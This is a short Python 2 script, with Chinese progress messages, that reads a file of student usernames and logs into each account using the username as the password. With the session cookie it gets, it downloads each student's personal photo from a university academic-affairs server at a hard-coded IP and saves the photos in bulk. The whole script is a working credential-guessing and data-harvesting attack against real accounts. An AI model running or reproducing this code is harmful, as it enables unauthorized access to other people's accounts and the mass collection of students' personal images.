#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import urllib
from time import sleep

def getCookie(username, password):
    url = 'http://localhost/student_login.php'
    data = urllib.urlencode({'username': username, 'password': password})
    req = urllib2.Request(url, data)
    res = urllib2.urlopen(req, None, 999)
    return res.read()

def getPhoto(username, cookie):
    url_photo = 'http://210.30.62.8:8080/jsxsd/grxx/xszpLoad'
    opener = urllib2.build_opener()
    opener.addheaders.append(('Cookie', cookie))
    data = opener.open(url_photo, None, 999).read()

    path = './2013/' + username + '.jpg'
    f = file(path, "wb")
    f.write(data)
    f.close()
    return;

def loop(file):
    f = open(file)
    line = f.readline()
    i = 1 
    while line:
        if getCookie(line, line):
            #socket.setdefaulttimeout(10)
            getPhoto(line, getCookie(line, line))
            print '进行到第'+str(i) +'个, 正在保存' + line + '的照片'
        else:
            print '进行到第'+ str(i) +'个,密码错误' + line,
        line = f.readline()
        i = i + 1
    f.close()
    sleep(10)

loop('./2013/username-2015.txt')
